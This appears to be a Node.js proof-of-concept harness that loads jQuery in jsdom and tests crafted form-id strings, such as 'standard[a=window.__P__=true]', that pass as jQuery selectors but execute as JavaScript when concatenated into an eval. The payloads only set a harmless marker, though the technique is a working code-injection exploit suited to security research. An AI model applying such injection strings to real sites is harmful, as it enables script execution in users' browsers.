const fs = require("fs");
const { JSDOM } = require("jsdom");
const jq = fs.readFileSync(__dirname + "/jq371.js", "utf8");

function test(format) {
  const d = new JSDOM(
    `<form id="poly_x" data-formula="x"><input id="x_standard" name="x" value="1"><input id="y_standard" name="y" value="2"><input name="formula" value="x"><div id="template_standard"></div></form>`,
    { runScripts: "dangerously", pretendToBeVisual: true, url: "https://x/" });
  const w = d.window;
  const s = w.document.createElement("script"); s.textContent = jq; w.document.head.appendChild(s);
  const $ = w.$;
  const form = w.document.querySelector("form");
  form.id = "poly_" + format;
  const sel = form.id.replace("poly_", "");
  let r = { len: null, pwn: false };
  try {
    const T = $("#template_" + sel);
    r.len = T.length;
    if (T.length === 0) {
      w.__P__ = false;
      w.type_standard = function () { return 1; };
      try {
        w.eval("window.__run=function(selected){ return eval('type_'+selected+'(this, selected)'); }");
        w.__run.call(form, sel);
        r.pwn = !!w.__P__;
      } catch (e) { r.ev = e.message.split("\n")[0]; }
    }
  } catch (e) { r.se = e.message.split("\n")[0]; }
  return r;
}

// Inside [a=VALUE], jQuery is lenient. In JS, type_standard[a=VALUE] runs `a=VALUE` (assignment).
// If VALUE is an executing expression, we win — the RESULT need not be a function because the code
// already ran during member-key evaluation; the trailing (this,selected) may then error harmlessly.
// Try executing expressions inside [a=...]:
const cands = [
  'standard[a=window.__P__=true]',              // assignment expression -> sets marker
  'standard[a=(window.__P__=true)]',            // parens inside attr value
  'standard[a=window.top.__P__=true]',
  'standard[href=window.__P__=true]',
  'standard[a="x"][b=window.__P__=true]',
];
for (const c of cands) console.log(JSON.stringify(c), "=>", JSON.stringify(test(c)));
